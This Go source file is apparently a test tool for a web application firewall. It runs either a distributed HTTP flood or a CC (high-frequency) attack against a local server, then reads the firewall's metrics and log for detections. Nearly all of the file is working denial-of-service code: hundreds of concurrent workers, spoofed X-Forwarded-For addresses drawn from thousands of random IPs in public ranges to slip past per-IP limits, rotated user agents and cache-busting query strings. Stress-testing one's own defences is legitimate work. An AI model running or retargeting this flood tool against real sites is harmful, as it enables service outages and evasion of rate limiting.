// Round 13 Distributed DDoS & CC Attack Tool
// Simulates real large-scale distributed attacks using X-Forwarded-For IP spoofing.
// WAF config has trust_forwarded: true, so X-Forwarded-For is trusted for IP identification.
//
// Usage: go run round13_distributed_attack.go [ddos|cc]
//   ddos - Application-layer HTTP Flood from distributed IPs
//   cc   - CC (Challenge Collapsar) attack: high-frequency requests to specific URLs

package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	TargetURL   = "http://127.0.0.1:8081"
	AdminURL    = "http://127.0.0.1:9090/stats"
	LogFile     = "/opt/shield/logs/shield.log"

	// DDoS configuration
	DDoSDuration       = 30 * time.Second
	DDoSMaxWorkers     = 500          // concurrent goroutines
	DDoSRequestsPerIP  = 5            // requests per fake IP
	DDoSTotalIPs       = 2000         // total distinct fake IPs
	DDoSTargetPaths    = 10           // different paths to spread across

	// CC configuration
	CCDuration         = 45 * time.Second
	CCMaxWorkers       = 300          // concurrent goroutines
	CCBurstSize        = 15           // requests per IP burst
	CCUniqueIPs        = 1000         // total distinct fake IPs
	CCTargetPaths      = 5            // focused paths (CC is more targeted)
)

// Generate random IP addresses across diverse subnets
func randomIP(rng *rand.Rand) string {
	// Generate IPs from diverse ranges to look more realistic
	subnets := [][]int{
		{10, 0, 0, 0},     // 10.0.0.0/8
		{172, 16, 0, 0},   // 172.16.0.0/12
		{192, 168, 0, 0},  // 192.168.0.0/16
		{100, 64, 0, 0},   // 100.64.0.0/10 (CGN)
		{1, 0, 0, 0},      // Public ranges
		{45, 0, 0, 0},
		{103, 0, 0, 0},
		{114, 0, 0, 0},
		{116, 0, 0, 0},
		{117, 0, 0, 0},
		{118, 0, 0, 0},
		{119, 0, 0, 0},
		{121, 0, 0, 0},
		{123, 0, 0, 0},
		{124, 0, 0, 0},
		{125, 0, 0, 0},
		{180, 0, 0, 0},
		{182, 0, 0, 0},
		{183, 0, 0, 0},
		{202, 0, 0, 0},
		{203, 0, 0, 0},
		{210, 0, 0, 0},
		{211, 0, 0, 0},
		{218, 0, 0, 0},
		{219, 0, 0, 0},
		{220, 0, 0, 0},
		{221, 0, 0, 0},
		{222, 0, 0, 0},
		{223, 0, 0, 0},
	}
	s := subnets[rng.Intn(len(subnets))]
	a := s[0] + rng.Intn(256-s[0])
	if a > 255 { a = s[0] }
	b := rng.Intn(256)
	c := rng.Intn(256)
	d := rng.Intn(254) + 1
	return fmt.Sprintf("%d.%d.%d.%d", a, b, c, d)
}

// Generate random User-Agent
func randomUA(rng *rand.Rand) string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S9080) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
	}
	return uas[rng.Intn(len(uas))]
}

func randomPath(rng *rand.Rand, numPaths int) string {
	paths := []string{
		"/",
		"/index.html",
		"/api/v1/users",
		"/api/v1/products",
		"/api/v1/search?q=test",
		"/login",
		"/admin",
		"/images/logo.png",
		"/css/style.css",
		"/js/app.js",
		"/api/v1/status",
		"/health",
		"/about",
		"/contact",
		"/products?page=1",
		"/search?keyword=test",
		"/category/electronics",
		"/user/profile",
		"/cart",
		"/checkout",
	}
	if numPaths > len(paths) {
		numPaths = len(paths)
	}
	return paths[rng.Intn(numPaths)]
}

// Stats counters
type AttackStats struct {
	totalSent       int64
	totalBlocked    int64
	totalChallenged int64
	totalPassed     int64
	totalErrors     int64
	totalRatelimit  int64
	startTime       time.Time
}

func (s *AttackStats) Print() {
	elapsed := time.Since(s.startTime)
	total := atomic.LoadInt64(&s.totalSent)
	fmt.Printf("\n  Total Sent:      %d\n", total)
	fmt.Printf("  Blocked (403):   %d (%.1f%%)\n", atomic.LoadInt64(&s.totalBlocked), pct(atomic.LoadInt64(&s.totalBlocked), total))
	fmt.Printf("  Challenged (429): %d (%.1f%%)\n", atomic.LoadInt64(&s.totalChallenged), pct(atomic.LoadInt64(&s.totalChallenged), total))
	fmt.Printf("  Passed (200):    %d (%.1f%%)\n", atomic.LoadInt64(&s.totalPassed), pct(atomic.LoadInt64(&s.totalPassed), total))
	fmt.Printf("  Errors:          %d\n", atomic.LoadInt64(&s.totalErrors))
	fmt.Printf("  Rate:            %.0f req/s\n", float64(total)/elapsed.Seconds())
}

func pct(part, total int64) float64 {
	if total == 0 {
		return 0
	}
	return float64(part) / float64(total) * 100
}

func makeClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:          200,
			MaxIdleConnsPerHost:   100,
			IdleConnTimeout:       90 * time.Second,
			DisableCompression:    false,
			DisableKeepAlives:     false,
			ResponseHeaderTimeout: 10 * time.Second,
		},
		Timeout: 15 * time.Second,
	}
}

func runDDoSAttack() {
	fmt.Println("=" + strings.Repeat("=", 59))
	fmt.Println("  DISTRIBUTED DDoS ATTACK - HTTP Flood")
	fmt.Printf("  Workers: %d | IPs: %d | Duration: %v | Paths: %d\n",
		DDoSMaxWorkers, DDoSTotalIPs, DDoSDuration, DDoSTargetPaths)
	fmt.Println("=" + strings.Repeat("=", 59))

	stats := &AttackStats{startTime: time.Now()}
	client := makeClient()

	// Pre-generate IP pool
	ips := make([]string, DDoSTotalIPs)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := range ips {
		ips[i] = randomIP(rng)
	}

	var wg sync.WaitGroup
	stopCh := make(chan struct{})

	// Launch workers
	for w := 0; w < DDoSMaxWorkers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			localRng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			for {
				select {
				case <-stopCh:
					return
				default:
				}

				// Pick a random IP from the pool
				ip := ips[localRng.Intn(len(ips))]
				path := randomPath(localRng, DDoSTargetPaths)
				ua := randomUA(localRng)

				req, _ := http.NewRequest("GET", TargetURL+path, nil)
				req.Header.Set("User-Agent", ua)
				req.Header.Set("X-Forwarded-For", ip)
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
				req.Header.Set("Accept-Language", "en-US,en;q=0.5")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Cache-Control", "no-cache")

				resp, err := client.Do(req)
				atomic.AddInt64(&stats.totalSent, 1)

				if err != nil {
					atomic.AddInt64(&stats.totalErrors, 1)
					continue
				}

				// Read and discard body
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()

				switch {
				case resp.StatusCode == 403:
					atomic.AddInt64(&stats.totalBlocked, 1)
				case resp.StatusCode == 429:
					reason := resp.Header.Get("X-Block-Reason")
					if reason == "cc_challenge" {
						atomic.AddInt64(&stats.totalChallenged, 1)
					} else {
						atomic.AddInt64(&stats.totalRatelimit, 1)
					}
				case resp.StatusCode == 200:
					atomic.AddInt64(&stats.totalPassed, 1)
				default:
					atomic.AddInt64(&stats.totalErrors, 1)
				}
			}
		}(w)
	}

	// Progress reporting
	ticker := time.NewTicker(5 * time.Second)
	go func() {
		for range ticker.C {
			elapsed := time.Since(stats.startTime)
			total := atomic.LoadInt64(&stats.totalSent)
			fmt.Printf("  [%ds] sent=%d blocked=%d challenged=%d passed=%d (%.0f req/s)\n",
				int(elapsed.Seconds()), total,
				atomic.LoadInt64(&stats.totalBlocked), atomic.LoadInt64(&stats.totalChallenged),
				atomic.LoadInt64(&stats.totalPassed),
				float64(total)/elapsed.Seconds())
		}
	}()

	// Run for duration
	time.Sleep(DDoSDuration)
	close(stopCh)
	ticker.Stop()
	wg.Wait()

	stats.Print()
}

func runCCAttack() {
	fmt.Println("=" + strings.Repeat("=", 59))
	fmt.Println("  DISTRIBUTED CC ATTACK - Application Layer")
	fmt.Printf("  Workers: %d | IPs: %d | Duration: %v | Burst: %d/path\n",
		CCMaxWorkers, CCUniqueIPs, CCDuration, CCBurstSize)
	fmt.Println("=" + strings.Repeat("=", 59))

	stats := &AttackStats{startTime: time.Now()}
	client := makeClient()

	// Pre-generate IP pool
	ips := make([]string, CCUniqueIPs)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := range ips {
		ips[i] = randomIP(rng)
	}

	// CC-specific: focus on few paths with high burst
	ccPaths := []string{
		"/",
		"/login",
		"/api/v1/search?q=popular",
		"/index.html",
		"/api/v1/products",
	}

	var wg sync.WaitGroup
	stopCh := make(chan struct{})

	for w := 0; w < CCMaxWorkers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			localRng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			for {
				select {
				case <-stopCh:
					return
				default:
				}

				// Each worker picks an IP and sends a burst to the same path
				ip := ips[localRng.Intn(len(ips))]
				path := ccPaths[localRng.Intn(len(ccPaths))]
				ua := randomUA(localRng)

				// Burst: multiple rapid requests from the same IP to same path
				for i := 0; i < CCBurstSize; i++ {
					select {
					case <-stopCh:
						return
					default:
					}

					req, _ := http.NewRequest("GET", TargetURL+path, nil)
					req.Header.Set("User-Agent", ua)
					req.Header.Set("X-Forwarded-For", ip)
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
					req.Header.Set("Accept-Language", "en-US,en;q=0.5")
					req.Header.Set("Connection", "keep-alive")
					req.Header.Set("Cache-Control", "no-cache")

					// Add varying query params to simulate real traffic
					if localRng.Intn(3) == 0 {
						v := localRng.Intn(10000)
						req.URL.RawQuery = fmt.Sprintf("_=%d&r=%d", time.Now().UnixNano(), v)
					}

					resp, err := client.Do(req)
					atomic.AddInt64(&stats.totalSent, 1)

					if err != nil {
						atomic.AddInt64(&stats.totalErrors, 1)
						continue
					}

					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()

					switch {
					case resp.StatusCode == 403:
						atomic.AddInt64(&stats.totalBlocked, 1)
					case resp.StatusCode == 429:
						reason := resp.Header.Get("X-Block-Reason")
						if reason == "cc_challenge" {
							atomic.AddInt64(&stats.totalChallenged, 1)
						} else {
							atomic.AddInt64(&stats.totalRatelimit, 1)
						}
					case resp.StatusCode == 200:
						atomic.AddInt64(&stats.totalPassed, 1)
					default:
						atomic.AddInt64(&stats.totalErrors, 1)
					}
				}

				// Small gap between bursts from this worker
				time.Sleep(time.Duration(50+localRng.Intn(100)) * time.Millisecond)
			}
		}(w)
	}

	ticker := time.NewTicker(5 * time.Second)
	go func() {
		for range ticker.C {
			elapsed := time.Since(stats.startTime)
			total := atomic.LoadInt64(&stats.totalSent)
			fmt.Printf("  [%ds] sent=%d blocked=%d challenged=%d passed=%d (%.0f req/s)\n",
				int(elapsed.Seconds()), total,
				atomic.LoadInt64(&stats.totalBlocked), atomic.LoadInt64(&stats.totalChallenged),
				atomic.LoadInt64(&stats.totalPassed),
				float64(total)/elapsed.Seconds())
		}
	}()

	time.Sleep(CCDuration)
	close(stopCh)
	ticker.Stop()
	wg.Wait()

	stats.Print()
}

func getMetrics() string {
	resp, err := http.Get(AdminURL)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return string(body)
}

func getLogStats() (int, map[string]int) {
	f, err := os.Open(LogFile)
	if err != nil {
		return 0, nil
	}
	defer f.Close()

	// Read last portion of log
	stat, _ := f.Stat()
	size := stat.Size()
	offset := size - 500000
	if offset < 0 {
		offset = 0
	}
	f.Seek(offset, 0)
	content, _ := io.ReadAll(f)

	msgCounts := map[string]int{}
	lines := 0
	for _, line := range strings.Split(string(content), "\n") {
		if strings.Contains(line, "request_blocked") || strings.Contains(line, "_detected") {
			lines++
			for _, keyword := range []string{
				"request_blocked_ddos",
				"request_blocked_cc",
				"request_blocked_sqlinject",
				"request_blocked_xss",
				"request_blocked_webshell",
				"request_blocked_bruteforce",
				"ddos_connection_limit",
				"ddos_distributed_detected",
				"ddos_goldeneye_detected",
				"cc_attack_detected",
				"ddos_rate_limit",
			} {
				if strings.Contains(line, keyword) {
					msgCounts[keyword]++
				}
			}
		}
	}
	return lines, msgCounts
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run round13_distributed_attack.go [ddos|cc]")
		os.Exit(1)
	}

	mode := os.Args[1]

	fmt.Printf("\nBefore Attack - WAF Metrics:\n%s\n\n", getMetrics())

	var attackType string
	switch mode {
	case "ddos":
		attackType = "DDoS"
		runDDoSAttack()
	case "cc":
		attackType = "CC"
		runCCAttack()
	default:
		fmt.Printf("Unknown mode: %s (use 'ddos' or 'cc')\n", mode)
		os.Exit(1)
	}

	time.Sleep(2 * time.Second)

	fmt.Printf("\n\nAfter %s Attack - WAF Metrics:\n%s\n", attackType, getMetrics())

	lines, msgCounts := getLogStats()
	fmt.Printf("\nLog Analysis (%s):\n", attackType)
	fmt.Printf("  Relevant log lines: %d\n", lines)
	for msg, count := range msgCounts {
		fmt.Printf("  %s: %d\n", msg, count)
	}

	fmt.Println("\nDone.")
}
